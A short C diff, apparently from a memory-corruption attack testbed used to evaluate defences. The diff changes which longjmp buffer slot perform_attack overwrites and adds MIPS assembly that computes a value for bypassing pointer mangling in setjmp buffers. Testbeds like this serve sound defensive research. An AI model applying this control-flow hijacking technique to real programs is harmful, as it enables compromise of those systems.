@@ -388,7 +388,7 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
           target_addr = &stack_jmp_buffer[0].__jmpbuf[1];
           break;
         case LONGJMP_BUF_STACK_PARAM:
-          target_addr = &stack_jmp_buffer_param[0].__jmpbuf[7];
+          target_addr = &stack_jmp_buffer_param[0].__jmpbuf[1];
           break;
         case LONGJMP_BUF_HEAP:
           target_addr = &(*heap_jmp_buffer)[0].__jmpbuf[7];
@@ -480,9 +480,12 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
       break;
     case LONGJMP_BUF_STACK_PARAM:
       // Make sure the setjmp() is successful
-      if (setjmp(stack_jmp_buffer_param) != 0)
+      setjmp_ret = setjmp(stack_jmp_buffer_param);
+      __asm__ __volatile__("move %0, $ra" : "=r"(payload.ptr_to_correct_return_addr));
+      payload.setjmp_guard = payload.ptr_to_correct_return_addr ^ stack_jmp_buffer_param[0].__jmpbuf[0].__pc;
+      if (setjmp_ret != 0)
         return;
-      payload.jmp_buffer = (void *)stack_jmp_buffer_param;
+      payload.jmp_buffer = (void*)stack_jmp_buffer_param;
       break;
     default:
       // Not an attack against a longjmp buffer
